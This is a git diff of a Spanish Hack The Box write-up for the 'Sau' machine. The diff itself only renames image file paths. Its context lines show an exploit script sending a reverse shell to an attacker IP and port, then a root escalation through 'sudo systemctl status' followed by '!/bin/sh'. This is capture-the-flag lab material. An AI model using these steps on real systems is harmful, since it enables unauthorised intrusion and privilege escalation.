@@ -162,17 +162,17 @@ $ python3 exploit.py 10.10.16.3 1234 http://10.10.11.224:55555/cochzx
 Running exploit on http://10.10.11.224:55555/cochzx
 ```
 
-![SAU](/assets/img/htb-writeups/Pasted image 20231123191947.png)
+![SAU](/assets/img/htb-writeups/Pasted-image-20231123191947.png)
 
 Somos el usuario _puma_.
 
 Si entramos en el directorio /home del usuario encontraremos nuestra primera flag:
 
-![SAU](/assets/img/htb-writeups/Pasted image 20231123193028.png)
+![SAU](/assets/img/htb-writeups/Pasted-image-20231123193028.png)
 
 Probamos si tiene privilegios de ejecución como superusuario en algún binario con _sudo -l_ y tenemos uno:
 
-![SAU](/assets/img/htb-writeups/Pasted image 20231123192715.png)
+![SAU](/assets/img/htb-writeups/Pasted-image-20231123192715.png)
 
 Puede ejecutar _systemctl_
 
@@ -188,7 +188,7 @@ $ sudo /usr/bin/systemctl status trail.service
 !/bin/sh
 ```
 
-![SAU](/assets/img/htb-writeups/Pasted image 20231123193727.png)
+![SAU](/assets/img/htb-writeups/Pasted-image-20231123193727.png)
 
 Registramos root y pa casa...
 ---
